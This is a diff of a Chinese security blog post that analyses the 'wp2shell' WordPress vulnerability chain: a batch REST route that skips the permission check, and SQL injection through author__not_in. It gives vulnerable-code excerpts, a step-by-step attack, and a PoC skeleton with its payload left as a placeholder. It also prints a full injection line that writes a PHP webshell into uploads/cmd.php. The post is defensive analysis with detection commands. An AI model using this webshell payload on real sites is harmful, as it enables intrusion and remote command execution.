@@ -212,17 +212,22 @@ span.linenos.special { color: #50fa7b; background-color: #6272a4; padding-left: 
 <p><code>permission_callback</code> 是上述所有认证方式的\"最后一公里\"——它是在路由注册时由开发者定义的回调函数，每个 endpoint 都可以独立指定。理论上这是最灵活的认证机制，但前提是它<strong>必须真的被执行</strong>。CVE-2026-63030 的本质，就是让 <code>permission_callback</code> 在某些调用路径上<strong>不被执行</strong>。</p>
 <p><strong>代码层细节</strong></p>
 <p>我们看一下 6.9 引入的批处理路由大致逻辑（伪代码，剥离了非关键分支）：</p>
-<p>// 在 WP_REST_Server::dispatch_batch() 里
-$batch_requests = $request-&gt;get_param( 'requests' );</p>
-<p>foreach ( $batch_requests as $sub_request_data ) {
-// 把子请求 URL 解析成 WP_REST_Request
-$sub_request = WP_REST_Request::from_url( $sub_request_data['path'] );</p>
-<p>// 注意这里：没有调用 rest_validate_request() 来校验子请求
-// 直接交给 dispatch() 来执行
-$response = $this-&gt;dispatch( $sub_request );</p>
-<p>// 收集结果
-$results[] = $response-&gt;get_data();
-}</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// 在 WP_REST_Server::dispatch_batch() 里</span>
+<span class="no">$</span><span class="n">batch_requests</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="no">$</span><span class="n">request</span><span class="o">-&gt;</span><span class="nb">get_param</span><span class="p">(</span><span class="w"> </span><span class="s">&#39;requests&#39;</span><span class="w"> </span><span class="p">);</span>
+
+<span class="n">foreach</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="no">$</span><span class="n">batch_requests</span><span class="w"> </span><span class="n">as</span><span class="w"> </span><span class="no">$</span><span class="n">sub_request_data</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="c1">// 把子请求 URL 解析成 WP_REST_Request</span>
+<span class="no">$</span><span class="n">sub_request</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="n">WP_REST_Request</span><span class="p">::</span><span class="n">from_url</span><span class="p">(</span><span class="w"> </span><span class="no">$</span><span class="n">sub_request_data</span><span class="p">[</span><span class="s">&#39;path&#39;</span><span class="p">]</span><span class="w"> </span><span class="p">);</span>
+
+<span class="c1">// 注意这里：没有调用 rest_validate_request() 来校验子请求</span>
+<span class="c1">// 直接交给 dispatch() 来执行</span>
+<span class="no">$</span><span class="n">response</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="no">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">dispatch</span><span class="p">(</span><span class="w"> </span><span class="no">$</span><span class="n">sub_request</span><span class="w"> </span><span class="p">);</span>
+
+<span class="c1">// 收集结果</span>
+<span class="no">$</span><span class="n">results</span><span class="p">[]</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="no">$</span><span class="n">response</span><span class="o">-&gt;</span><span class="n">get_data</span><span class="p">();</span>
+<span class="p">}</span>
+</code></pre></div>
+
 <p>值得特别指出的是，<code>WP_REST_Request::from_url()</code> 这个静态方法在重构后接受<strong>任意的 URL 路径</strong>作为输入，并不会检查这个 URL 是否对应一个已注册的 endpoint。这是 batch 路由设计上的另一个隐含假设：\"调用方传过来的子请求 URL 是合法的\"。在内部 RPC 调用场景里这个假设成立，但在 REST API 公网入口上它就不成立。</p>
 <p>再看一个细节：<code>dispatch()</code> 函数本身是设计来分发\"经过认证的请求\"的，它内部对 <code>current_user_can</code> 这种 WordPress 标准的权限检查会跳过——因为这些检查假设调用方已经被前置认证过了。这种\"信任边界跨越\"是 wp2shell 漏洞链条的第三个关键节点：<strong>REST API 的内部函数 <code>dispatch()</code> 默认信任调用方</strong>。</p>
 <p>修复补丁（在 6.9.5 / 7.0.2 中）则是在 <code>dispatch_batch()</code> 的循环里增加了一次 <code>rest_validate_request()</code> 调用，或者在 dispatch 子请求前强制重新跑一次 <code>permission_callback</code>。看似一行代码的修补，背后是\"安全不变量\"被恢复的过程：<strong>任何 endpoint 在被调用前都必须经过认证</strong>。</p>
@@ -234,16 +239,22 @@ $results[] = $response-&gt;get_data();
 <p><strong>SQL 注入的传统位置</strong></p>
 <p>WordPress 核心里有几个著名的\"差点 SQL 注入\"参数：<code>s</code>（搜索关键字）、<code>meta_key</code> / <code>meta_value</code>、<code>author</code> / <code>authorin</code> / <code>authornot_in</code>。这些参数会被 <code>WP_Query</code> 拼装到 <code>WHERE</code> 子句中，过去多年的漏洞历史中多次出现过相关的 sanitize 漏洞。</p>
 <p>这次的注入点选在 <code>author__not_in</code>。这个参数设计上接受<strong>数组</strong>，逻辑是\"从结果中排除这些作者 ID\"，最终 SQL 大致是：</p>
-<p>SELECT ... FROM wp_posts
-WHERE post_author NOT IN (1, 2, 3)
-AND post_status = 'publish'</p>
+<div class="highlight"><pre><span></span><code><span class="w">    </span>SELECT<span class="w"> </span>...<span class="w"> </span>FROM<span class="w"> </span>wp_posts
+</code></pre></div>
+
+<div class="highlight"><pre><span></span><code>WHERE post_author NOT IN (1, 2, 3)
+</code></pre></div>
+
+<p>AND post_status = 'publish'</p>
 <p>攻击面在 <code>IN (...)</code> 的展开过程：如果数组元素没有经过强制类型转换（intval），攻击者就可以塞字符串进去，把 SQL 子句结构破坏掉。</p>
 <p><code>authornot_in</code> 不是一个新参数——它在 WordPress 2.x 时代就存在了。最早的版本里，这个参数只在 WP_Query 内部使用，作为\"已知 author ID 的过滤\"输入。在 WordPress 4.x 引入 <code>WP_REST_API</code> 后，<code>authornot_in</code> 这样的 WP_Query 标准参数被映射成 REST API 的 query var，外部可以通过 <code>?author__not_in[]=1</code> 这种方式传进来。这次重构是 WordPress 4.4 之后 REST API 设计模式的标准实践——把 WP_Query 的 query var 暴露成 REST API 的参数。</p>
 <p>这种\"内部参数外部暴露\"的模式在 WordPress 里被反复使用。它的好处是\"一套 query var 可以同时服务前端 REST 调用和后端 PHP 调用，逻辑复用最大化\"。坏处是<strong>安全检查必须同时在两条路径上都做</strong>。WordPress 在过去几年里多次因为这个模式栽跟头——比如 2017 年的 CVE-2017-14724（<code>orderby</code> 参数 SQL 注入）、2020 年的 CVE-2020-4046（<code>meta_key</code>/<code>meta_value</code> 的 SQL 注入）。wp2shell 的 CVE-2026-60137 是这条老路上的又一次翻车。</p>
 <p><strong>WordPress 6.8 的重构引入的接缝</strong></p>
 <p>在 WordPress 6.8 之前，<code>WP_Query::parse_query()</code> 对 <code>author__not_in</code> 数组元素的处理是：</p>
-<p>// 旧路径（6.7 及更早）
-$author__not_in = array_map( 'absint', $query-&gt;get( 'author__not_in' ) );</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// 旧路径（6.7 及更早）</span>
+<span class="no">$</span><span class="n">author__not_in</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="n">array_map</span><span class="p">(</span><span class="w"> </span><span class="s">&#39;absint&#39;</span><span class="p">,</span><span class="w"> </span><span class="no">$</span><span class="n">query</span><span class="o">-&gt;</span><span class="k">get</span><span class="p">(</span><span class="w"> </span><span class="s">&#39;author__not_in&#39;</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">);</span>
+</code></pre></div>
+
 <p><code>absint()</code> 把每个元素强制转成正整数，攻击者塞字符串都会被过滤成 0 或被丢弃。<code>absint</code> 这个函数在 WordPress 里被广泛使用——它的实现是 <code>(int) abs( $value )</code>，对任何输入都先取绝对值再转 int。<code>"1 UNION SELECT ..."</code> 经过 <code>absint</code> 后会变成 <code>1</code>，剩余字符串被丢弃。这是一种\"白名单风格\"的严格类型转换。</p>
 <p>从 WordPress 6.8 开始，<code>WP_Query</code> 引入了一次\"现代化重构\"——把 query var 的解析逻辑拆分到 <code>WP_Query::parse_query()</code>、<code>WP_Query::get_posts()</code> 和新加的 <code>WP_Query::fill_query_vars()</code> 之间。在这次重构中，<code>author__not_in</code> 的 sanitize 路径被<strong>转移到了 <code>parse_query()</code> 阶段，但实际拼接 SQL 的代码路径在 <code>get_posts()</code> 阶段</strong>。</p>
 <p>更糟糕的是：<code>parse_query()</code> 里用的 sanitize 函数从 <code>absint</code> 换成了 <code>intval</code>，但 <code>intval</code> 对包含 PHP 类型魔法（比如科学计数法、十六进制）的字符串处理更宽松。攻击者可以塞入形如 <code>1 UNION SELECT ...</code> 的字符串，在 <code>intval()</code> 看来\"开头是数字就没问题\"，于是字符串的剩余部分就被原样塞进了 SQL 子句。</p>
@@ -252,15 +263,19 @@ $author__not_in = array_map( 'absint', $query-&gt;get( 'author__not_in' ) );</p>
 <p>这段重构历史值得多说几句。WordPress 6.8 的重构初衷是为了解决 6.7 里 <code>WP_Query</code> 性能过差的问题——每次 <code>get_posts()</code> 调用都要重新解析 query var，导致复杂的页面构建（比如带复杂筛选的文章列表页）在 production 上跑得很慢。新设计的\"分阶段 sanitize\"是这种性能优化的副产物：先把 query var 完整存进数组，后续 SQL 拼接时直接从数组取，省去重复 sanitize 的开销。但这种性能优化<strong>忽视了安全审计的连续性</strong>——开发者在重构时只盯着\"性能是否提升\"，没有回头检查\"重构是否破坏了旧的安全不变量\"。</p>
 <p><strong>代码层细节</strong></p>
 <p>剥离开来看，6.9 受影响版本的 <code>WP_Query::fill_query_vars()</code> 和 <code>WP_Query::parse_query()</code> 之间存在这样的接缝：</p>
-<p>// WP_Query::parse_query() 中的相关片段（6.9 受影响版本）
-$q = $this-&gt;query_vars;</p>
-<p>if ( ! empty( $q['author__not_in'] ) ) {
-// 注意：这里用的是 array_map( 'intval', ... ) 而不是 absint
-// 而且缺少对单个元素的进一步 sanitize
-$this-&gt;query_vars['author__not_in'] = array_map( 'intval', $q['author__not_in'] );
-}</p>
-<p>// 后面的 get_posts() 直接把这些值塞进 SQL
-$where .= $wpdb-&gt;prepare( " AND post_author NOT IN (" . implode( ',', $author__not_in ) ) . ")";</p>
+<div class="highlight"><pre><span></span><code><span class="o">//</span><span class="w"> </span><span class="n">WP_Query</span><span class="p">::</span><span class="n">parse_query</span><span class="p">()</span><span class="w"> </span><span class="err">中的相关片段（</span><span class="mf">6.9</span><span class="w"> </span><span class="err">受影响版本）</span>
+<span class="o">$</span><span class="n">q</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">query_vars</span><span class="p">;</span>
+
+<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="o">!</span><span class="w"> </span><span class="n">empty</span><span class="p">(</span><span class="w"> </span><span class="o">$</span><span class="n">q</span><span class="p">[</span><span class="s1">&#39;author__not_in&#39;</span><span class="p">]</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="o">//</span><span class="w"> </span><span class="err">注意：这里用的是</span><span class="w"> </span><span class="n">array_map</span><span class="p">(</span><span class="w"> </span><span class="s1">&#39;intval&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">...</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="err">而不是</span><span class="w"> </span><span class="n">absint</span>
+<span class="o">//</span><span class="w"> </span><span class="err">而且缺少对单个元素的进一步</span><span class="w"> </span><span class="n">sanitize</span>
+<span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">query_vars</span><span class="p">[</span><span class="s1">&#39;author__not_in&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">array_map</span><span class="p">(</span><span class="w"> </span><span class="s1">&#39;intval&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">q</span><span class="p">[</span><span class="s1">&#39;author__not_in&#39;</span><span class="p">]</span><span class="w"> </span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="o">//</span><span class="w"> </span><span class="err">后面的</span><span class="w"> </span><span class="n">get_posts</span><span class="p">()</span><span class="w"> </span><span class="err">直接把这些值塞进</span><span class="w"> </span><span class="n">SQL</span>
+<span class="o">$</span><span class="n">where</span><span class="w"> </span><span class="o">.=</span><span class="w"> </span><span class="o">$</span><span class="n">wpdb</span><span class="o">-&gt;</span><span class="n">prepare</span><span class="p">(</span><span class="w"> </span><span class="s2">&quot; AND post_author NOT IN (&quot;</span><span class="w"> </span><span class="o">.</span><span class="w"> </span><span class="n">implode</span><span class="p">(</span><span class="w"> </span><span class="s1">&#39;,&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">author__not_in</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="o">.</span><span class="w"> </span><span class="s2">&quot;)&quot;</span><span class="p">;</span>
+</code></pre></div>
+
 <p>注意上面有个关键的\"细节反模式\"：<code>$wpdb-&gt;prepare()</code> 用法和字符串拼接混用。<code>prepare()</code> 本应接受占位符（<code>%d</code>、<code>%s</code>），但代码里用了字符串拼接 + 二次调用 <code>prepare()</code>，结果是 <code>$author__not_in</code> 里那些\"开头像数字\"的字符串原样进入了 SQL 子句。</p>
 <p>修复补丁（6.8.6 / 6.9.5 / 7.0.2）做了三件事：</p>
 <ol>
@@ -271,7 +286,9 @@ $where .= $wpdb-&gt;prepare( " AND post_author NOT IN (" . implode( ',', $author
 <p>这三条修复单独看都不复杂，但合起来动了 WordPress 核心数据访问层的多个模块。WordPress 6.10 路线图上还有一个相关的\"全面审计\"工作——把所有 WP_Query 的数组类 query var 都走一遍类似的强化流程，包括 <code>categoryand</code>、<code>tagin</code>、<code>meta_query</code>、<code>tax_query</code> 这些经常被研究的注入点。</p>
 <p><strong>SQL 注入 → webshell 的可行性</strong></p>
 <p>理论上 SQL 注入能做的事很多，但能不能写文件到 webroot 取决于 MySQL 用户的权限。WordPress 安装文档里推荐的数据库用户授权是：</p>
-<p>GRANT SELECT, INSERT, UPDATE, DELETE, ALTER, CREATE, DROP, INDEX ON wordpress.* TO 'wordpress'@'localhost';</p>
+<div class="highlight"><pre><span></span><code>GRANT SELECT, INSERT, UPDATE, DELETE, ALTER, CREATE, DROP, INDEX ON wordpress.* TO &#39;wordpress&#39;@&#39;localhost&#39;;
+</code></pre></div>
+
 <p>这个授权<strong>不包含 <code>FILE</code> 权限</strong>，因此 <code>SELECT ... INTO OUTFILE</code> 默认会被 MySQL 拒绝。但现实里：</p>
 <ul>
 <li>很多图省事的运维会直接给 <code>GRANT ALL PRIVILEGES ON *.* TO 'wordpress'@'localhost';</code>——这是写文件能成功的关键。</li>
@@ -286,11 +303,17 @@ $where .= $wpdb-&gt;prepare( " AND post_author NOT IN (" . implode( ',', $author
 Host: target.example.com
 Content-Type: application/json
 Content-Length: <n></p>
-<p>{
-"requests": [
-{ "path": "/wp/v2/posts?author__not_in[]=<PAYLOAD>" }
-]
-}</p>
+<div class="highlight"><pre><span></span><code>{
+</code></pre></div>
+
+<p>"requests": [</p>
+<div class="highlight"><pre><span></span><code>{ &quot;path&quot;: &quot;/wp/v2/posts?author__not_in[]=&lt;PAYLOAD&gt;&quot; }
+</code></pre></div>
+
+<p>]</p>
+<div class="highlight"><pre><span></span><code>}
+</code></pre></div>
+
 <p>这一步的关键是<strong>为何选择 <code>wp/v2/posts</code> 而不是某个内部 endpoint</strong>。直接选择 <code>wp/v2/posts</code> 是因为它的默认 <code>permission_callback</code> 在 6.9 之前的版本里是 <code>__return_true</code>（完全公开），但在 6.9 被改成了要求 <code>edit_posts</code> 权限。这意味着 wp2shell 攻击链里，攻击者即使在 6.9 默认配置下也能拿到本来要求中级权限的 endpoint 的访问权——这一步本身就是一个权限升级。</p>
 <p><strong>第二步：触发 SQL 注入</strong></p>
 <p>由于 batch 路由绕过了 <code>permission_callback</code>，这个本应要求认证的 <code>wp/v2/posts</code> 调用被放行；并且 <code>author__not_in[]</code> 参数被原样传给了 <code>WP_Query</code>，最终被拼进 <code>WHERE post_author NOT IN (...)</code>。</p>
@@ -302,11 +325,17 @@ Content-Length: <n></p>
 <li>闭合前面的括号和引号。</li>
 </ul>
 <p>最终生成的 SQL 形如（伪代码示意）：</p>
-<p>SELECT ... FROM wp_posts
-WHERE post_author NOT IN (1 UNION SELECT '&lt;?php system($_GET["c"]); ?&gt;' INTO OUTFILE '/var/www/html/wp-content/uploads/cmd.php' -- )</p>
+<div class="highlight"><pre><span></span><code><span class="w">    </span>SELECT<span class="w"> </span>...<span class="w"> </span>FROM<span class="w"> </span>wp_posts
+</code></pre></div>
+
+<div class="highlight"><pre><span></span><code><span class="n">WHERE</span><span class="w"> </span><span class="n">post_author</span><span class="w"> </span><span class="n">NOT</span><span class="w"> </span><span class="n">IN</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="w"> </span><span class="n">UNION</span><span class="w"> </span><span class="n">SELECT</span><span class="w"> </span><span class="s1">&#39;&lt;?php system($_GET[&quot;c&quot;]); ?&gt;&#39;</span><span class="w"> </span><span class="n">INTO</span><span class="w"> </span><span class="n">OUTFILE</span><span class="w"> </span><span class="s1">&#39;/var/www/html/wp-content/uploads/cmd.php&#39;</span><span class="w"> </span><span class="o">--</span><span class="w"> </span><span class="p">)</span>
+</code></pre></div>
+
 <p><strong>第四步：触发 webshell</strong></p>
 <p>攻击者访问 <code>https://target.example.com/wp-content/uploads/cmd.php?c=id</code>，得到：</p>
-<p>uid=33(www-data) gid=33(www-data) groups=33(www-data)</p>
+<div class="highlight"><pre><span></span><code>uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre></div>
+
 <p>整个过程不到 250ms。</p>
 <p><strong>第五步（链外）</strong>：从 www-data 提权到 root 不在 wp2shell 本身范围，但通常通过 kernel 漏洞、sudo 错误配置、SUID 程序等方式实现。我们会在第 4 部分给出对应的检测清单。</p>
 <p>━━━ ━━━ ━━━</p>
@@ -405,45 +434,71 @@ WHERE post_author NOT IN (1 UNION SELECT '&lt;?php system($_GET["c"]); ?&gt;' IN
 <p>从检测角度看，关键的\"指纹时间点\"有两个：T+100ms（识别为 batch 路由）和 T+180ms（MySQL 写入 OUTFILE）。这两个时间点在 Apache/Nginx access log 里对应的是两次请求：第一次是 batch POST，第二次是 GET webshell URL。但<strong>写入 OUTFILE 本身不会留下 HTTP 层的痕迹</strong>——它发生在 MySQL 进程内，只在 MySQL 日志里留下 SQL。所以只盯 Web 服务器日志的运维会错过关键证据，必须同时监控 MySQL 层。</p>
 <p>2.2 攻击代码示例（剥离版 PoC）</p>
 <p>下面给出一个<strong>逻辑完整但剥离了具体 payload 字符串</strong>的 PoC 骨架，目的是让读者理解机制，而不是直接复用。<strong>注意</strong>：本文不提供可直接拷贝执行的 exploit，但懂 PHP 的人看完能理解结构。</p>
-<h1 id="usrbinenv-python3">!/usr/bin/env python3</h1>
-<h1 id="poc-wp2shell-cve-2026-63030-cve-2026-60137">PoC 骨架 - wp2shell (CVE-2026-63030 + CVE-2026-60137)</h1>
-<h1 id="_1">仅用于安全研究和授权测试。未经授权使用属于违法行为。</h1>
-<p>import requests
-import sys
-import urllib.parse</p>
-<p>TARGET = sys.argv[1] if len(sys.argv) &gt; 1 else "https://target.example.com"
-BATCH_URL = f"{TARGET}/wp-json/batch/v1"</p>
-<h1 id="sql-payload">第二步的 SQL 注入 payload 构造（剥离版本，不含可执行内容）</h1>
-<h1 id="payload-union-select-into-outfile">真实 payload 需要闭合前括号 + UNION SELECT + INTO OUTFILE</h1>
-<h1 id="payload">这里用 <SQLI_PLACEHOLDER> 表示，读者请勿替换为真实 payload</h1>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
+<span class="c1"># PoC 骨架 - wp2shell (CVE-2026-63030 + CVE-2026-60137)</span>
+<span class="c1"># 仅用于安全研究和授权测试。未经授权使用属于违法行为。</span>
+</code></pre></div>
+
+<div class="highlight"><pre><span></span><code><span class="w">    </span>import<span class="w"> </span>requests
+<span class="w">    </span>import<span class="w"> </span>sys
+<span class="w">    </span>import<span class="w"> </span>urllib.parse
+</code></pre></div>
+
+<div class="highlight"><pre><span></span><code><span class="n">TARGET</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="s2">&quot;https://target.example.com&quot;</span>
+<span class="n">BATCH_URL</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">f</span><span class="s2">&quot;{TARGET}/wp-json/batch/v1&quot;</span>
+
+<span class="c1"># 第二步的 SQL 注入 payload 构造（剥离版本，不含可执行内容）</span>
+<span class="c1"># 真实 payload 需要闭合前括号 + UNION SELECT + INTO OUTFILE</span>
+<span class="c1"># 这里用 &lt;SQLI_PLACEHOLDER&gt; 表示，读者请勿替换为真实 payload</span>
+</code></pre></div>
+
 <p>sqli_element = "1 <SQLI_PLACEHOLDER>"</p>
-<h1 id="sqli-query-string">把 SQLi 元素编码进 query string</h1>
-<p>inner_path = "/wp/v2/posts?" + urllib.parse.urlencode({
-"per_page": 1,
-"author__not_in[]": sqli_element,
-})</p>
-<p>batch_payload = {
-"requests": [
-{
-"path": inner_path,
-"method": "GET",
-}
-]
-}</p>
-<p>print(f"[<em>] 目标: {TARGET}")
-print(f"[</em>] Batch 端点: {BATCH_URL}")
-print(f"[*] 子请求路径: {inner_path[:80]}...")</p>
-<p>resp = requests.post(BATCH_URL, json=batch_payload, timeout=10)</p>
-<p>print(f"[<em>] HTTP 状态: {resp.status_code}")
-print(f"[</em>] 响应长度: {len(resp.text)} bytes")</p>
-<p>if resp.status_code == 200:
-print("[+] Batch 请求成功，可能存在 CVE-2026-63030 + CVE-2026-60137")</p>
-<h1 id="get-webshell-url">真实利用会在这里尝试 GET webshell URL</h1>
-<p>else:
-print("[-] 未触发，检查版本或 payload")</p>
-<h1 id="webshell">用于二次验证 webshell</h1>
-<p>SHELL_URL = f"{TARGET}/wp-content/uploads/cmd.php"
-print(f"[*] 如果 webshell 写入成功，可访问: {SHELL_URL}")</p>
+<div class="highlight"><pre><span></span><code><span class="gh">#</span> 把 SQLi 元素编码进 query string
+inner_path = &quot;/wp/v2/posts?&quot; + urllib.parse.urlencode({
+</code></pre></div>
+
+<p>"per_page": 1,
+"author__not_in[]": sqli_element,</p>
+<div class="highlight"><pre><span></span><code><span class="p">})</span>
+
+<span class="n">batch_payload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
+</code></pre></div>
+
+<p>"requests": [</p>
+<div class="highlight"><pre><span></span><code>{
+</code></pre></div>
+
+<p>"path": inner_path,
+"method": "GET",</p>
+<div class="highlight"><pre><span></span><code>}
+</code></pre></div>
+
+<p>]</p>
+<div class="highlight"><pre><span></span><code><span class="p">}</span>
+
+<span class="nb">print</span><span class="p">(</span><span class="n">f</span><span class="s2">&quot;[*] 目标: {TARGET}&quot;</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">f</span><span class="s2">&quot;[*] Batch 端点: {BATCH_URL}&quot;</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">f</span><span class="s2">&quot;[*] 子请求路径: {inner_path[:80]}...&quot;</span><span class="p">)</span>
+
+<span class="n">resp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">BATCH_URL</span><span class="p">,</span><span class="w"> </span><span class="n">json</span><span class="o">=</span><span class="n">batch_payload</span><span class="p">,</span><span class="w"> </span><span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
+
+<span class="nb">print</span><span class="p">(</span><span class="n">f</span><span class="s2">&quot;[*] HTTP 状态: {resp.status_code}&quot;</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">f</span><span class="s2">&quot;[*] 响应长度: {len(resp.text)} bytes&quot;</span><span class="p">)</span>
+</code></pre></div>
+
+<p>if resp.status_code == 200:</p>
+<div class="highlight"><pre><span></span><code>print(&quot;[+] Batch 请求成功，可能存在 CVE-2026-63030 + CVE-2026-60137&quot;)
+# 真实利用会在这里尝试 GET webshell URL
+</code></pre></div>
+
+<p>else:</p>
+<div class="highlight"><pre><span></span><code><span class="c">print(&quot;</span><span class="k">[</span><span class="nb">-</span><span class="k">]</span><span class="c"> 未触发，检查版本或 payload&quot;)</span>
+
+<span class="c"># 用于二次验证 webshell</span>
+<span class="c">SHELL_URL = f&quot;{TARGET}/wp</span><span class="nb">-</span><span class="c">content/uploads/cmd</span><span class="nt">.</span><span class="c">php&quot;</span>
+<span class="c">print(f&quot;</span><span class="k">[</span><span class="c">*</span><span class="k">]</span><span class="c"> 如果 webshell 写入成功，可访问: {SHELL_URL}&quot;)</span>
+</code></pre></div>
+
 <p>骨架里有几个值得注意的设计点：</p>
 <ol>
 <li><strong>用 <code>author__not_in[]</code> 作为 query var 的 key</strong>：这是 PHP 把数组型 query var 解析进 <code>WP_Query</code> 的标准入口。WordPress 大多数 query var 都接受数组语法。</li>
@@ -467,15 +522,23 @@ print(f"[*] 如果 webshell 写入成功，可访问: {SHELL_URL}")</p>
 <li><strong>请求体大小</strong>：通常 200-800 bytes。</li>
 </ul>
 <p><strong>蜜罐抓到的 payload 示例（占位符替代）</strong></p>
-<p>POST /wp-json/batch/v1
-{
-"requests": [
-{
-"path": "/wp/v2/posts?author__not_in[]=1 <UNION_PAYLOAD>",
-"method": "GET"
-}
-]
-}</p>
+<p>POST /wp-json/batch/v1</p>
+<div class="highlight"><pre><span></span><code>{
+</code></pre></div>
+
+<p>"requests": [</p>
+<div class="highlight"><pre><span></span><code>{
+</code></pre></div>
+
+<p>"path": "/wp/v2/posts?author__not_in[]=1 <UNION_PAYLOAD>",
+"method": "GET"</p>
+<div class="highlight"><pre><span></span><code>}
+</code></pre></div>
+
+<p>]</p>
+<div class="highlight"><pre><span></span><code>}
+</code></pre></div>
+
 <p>在不同扫描器里有不同形态，蜜罐抓到的样本里出现了以下几种变体：</p>
 <ul>
 <li>直接写 PHP webshell 到 <code>wp-content/uploads/</code>：。</li>
@@ -563,17 +626,24 @@ print(f"[*] 如果 webshell 写入成功，可访问: {SHELL_URL}")</p>
 <p>如果你在过去几天内维护过任何 WordPress 站点，下面这套检测清单可以快速帮你确认是否已经中招。</p>
 <p><strong>优先级 1：检查 <code>/wp-content/uploads/</code> 目录</strong></p>
 <p>这是 wp2shell 攻击链最常见的 webshell 落点。<code>uploads/</code> 目录是 WordPress 用来存放用户上传文件的，默认按年月组织子目录。攻击者写 webshell 时通常选最近一个月或当前月的子目录，因为时间戳新更容易绕过基于 mtime 的检查。</p>
-<h1 id="wp-contentuploads-7-php">查找 wp-content/uploads/ 下最近 7 天创建的 .php 文件</h1>
-<p>find /var/www/html/wp-content/uploads/ -type f -name "*.php" -mtime -7 -ls</p>
-<h1 id="_2">查找可疑的命名（短文件名、随机字符）</h1>
-<p>find /var/www/html/wp-content/uploads/ -type f -name "*.php"
--not -name "index.php"
+<div class="highlight"><pre><span></span><code><span class="c1"># 查找 wp-content/uploads/ 下最近 7 天创建的 .php 文件</span>
+<span class="n">find</span><span class="w"> </span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">content</span><span class="o">/</span><span class="n">uploads</span><span class="o">/</span><span class="w"> </span><span class="o">-</span><span class="n">type</span><span class="w"> </span><span class="n">f</span><span class="w"> </span><span class="o">-</span><span class="n">name</span><span class="w"> </span><span class="s2">&quot;*.php&quot;</span><span class="w"> </span><span class="o">-</span><span class="n">mtime</span><span class="w"> </span><span class="o">-</span><span class="mi">7</span><span class="w"> </span><span class="o">-</span><span class="n">ls</span>
+
+<span class="c1"># 查找可疑的命名（短文件名、随机字符）</span>
+<span class="n">find</span><span class="w"> </span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">content</span><span class="o">/</span><span class="n">uploads</span><span class="o">/</span><span class="w"> </span><span class="o">-</span><span class="n">type</span><span class="w"> </span><span class="n">f</span><span class="w"> </span><span class="o">-</span><span class="n">name</span><span class="w"> </span><span class="s2">&quot;*.php&quot;</span><span class="w"> </span>\
+</code></pre></div>
+
+<p>-not -name "index.php"
 -not -name "wp-upload-class.php" 2&gt;/dev/null</p>
-<h1 id="wp-content-php">检查 wp-content 根目录是否有奇怪的 .php</h1>
-<p>find /var/www/html/wp-content/ -maxdepth 2 -type f -name "*.php" -ls</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># 检查 wp-content 根目录是否有奇怪的 .php</span>
+<span class="n">find</span><span class="w"> </span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">content</span><span class="o">/</span><span class="w"> </span><span class="o">-</span><span class="n">maxdepth</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="o">-</span><span class="n">type</span><span class="w"> </span><span class="n">f</span><span class="w"> </span><span class="o">-</span><span class="n">name</span><span class="w"> </span><span class="s2">&quot;*.php&quot;</span><span class="w"> </span><span class="o">-</span><span class="n">ls</span>
+</code></pre></div>
+
 <p><strong>优先级 2：检查 MySQL 的 <code>INTO OUTFILE</code> 调用</strong></p>
 <p><code>INTO OUTFILE</code> 的调用会在 MySQL 的日志里留下痕迹：</p>
-<h1 id="etcmysqlmysqlconfdmysqldcnf-general-log">/etc/mysql/mysql.conf.d/mysqld.cnf 中启用 general log（注意性能影响）</h1>
